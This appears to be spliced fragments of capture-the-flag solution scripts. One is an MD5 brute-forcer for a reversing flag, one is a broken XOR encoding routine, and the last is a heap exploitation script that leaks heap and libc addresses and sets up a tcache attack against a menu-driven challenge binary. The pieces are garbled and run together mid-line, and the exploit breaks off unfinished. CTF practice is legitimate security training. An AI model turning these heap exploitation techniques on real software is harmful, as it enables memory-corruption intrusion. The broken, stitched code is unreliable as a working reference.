    a1[14] = '4'
    a1[18] = '-'
    a1[17] = '4'
    a1[19] = '9'
    a1[15] = '5'
    a1[21] = 'a'
    a1[25] = '9'
    a1[33] = 'f'
    a1[34] = '6'
    a1[28] = '6'
    a1[32] = 'b'
    a1[30] = '0'
    a1[27] = '4'
    a1[31] = '4'
    a1[29] = 'e'
    a1[26] = '6'
    a1[35] = '8'
    a1[24] = '6'
    a1[2] = '6'
    a1[6] = '8'
    a1[1] = '2'
    a1[7] = '7'
    a1[5] = '0'
    a1[4] = '0'
    a1[8] = '-'
    a1[0] = '8'
    a1[3] = '0'
    a1[36] = '\\n' # 'fuck'
    md5sum_a2 = ['1'] * 11
    md5sum_a2[4] = 'a'
    md5sum_a2[6] = '4'
    md5sum_a2[10] = 'd'
    md5sum_a2[0] = '9'
    md5sum_a2[3] = 'd'
    md5sum_a2[1] = '4'
babyre
    md5sum_a2[5] = '8'
    md5sum_a2[2] = 'b'
    md5sum_a2[8] = '9'
    md5sum_a2[7] = '7'
    md5sum_a2[9] = '9'
    md5sum_a2 = ''.join(md5sum_a2)
    for a in tbl:
        for b in tbl:
            for c in tbl:
                for d in tbl:
                    a1[9], a1[10], a1[11], a1[12] = a, b, c, d
                    flag = ''.join(a1)
                    md5 = get_md5_value(flag)
                    if md5.startswith(md5sum_a2):
                        print('flag{' + flag[:-1] + '}')
                        exit()
if __name__ == '__main__':
    brut()
def enc(flag):
    xor_tbl = [0x1bc3, 0xa74, 0xce4f, 0xe52, 0xd34b, 0x7069, 0x8a27, 0x295a,
               0x630e, 0xfe27, 0x18a7, 0x5f86, 0xa747, 0x839f, 0x41ff, 0x1bc3]
    result = [0] * 16
    __hash = 0x0000000064E2FBE3 & 0xffff
    v9 = 0
    while v9  ',str(1))
    sl('index:',str(idx))
    sl('ball:',str(size))
    s('name:',name)
def throw(idx):
    sl('> ',str(2))
    sl('ball:',str(idx))
def show(idx):
    sl('> ',str(3))
    sl('ball:',str(idx))
    r('dance:')
def change(idx, name):
    sl('> ',str(4))
    sl('ball:', str(idx))
    s('ball:', name)
def secret(cnt):
    sl('> ',str(5))
    s('place:', cnt)
def backdoor():
    sl('> ',str(0x666))
# leaking heap
buy(0,0x88,'0'*0x88)
throw(0)
buy(0,0x88,'0'*0x88)
throw(0)
show(0)
heap = u64(r('\n').ljust(0x8,'\x00'))-0x2a0
log.info('h.address:'+hex(heap))
# leaking libc
for i in range(5):
    buy(0,0x88,'0'*0x88)
    throw(0)
buy(0,0x88,'0'*0x88)
buy(1,0x1f8,'1'*0xf8)
throw(0)
show(0)
l.address = u64(r('\n').ljust(0x8,'\x00'))-0x1eabe0
log.info('l.address:'+hex(l.address))
setcontext = l.address+0x58000
log.info('setcontext:'+hex(setcontext))
# smabll bin tcache attack
buy(0, 0x88, '0'*0x88)
for i in range(0x7):
    throw(1)
    buy(1,0x1f8,'1'*0x1f8)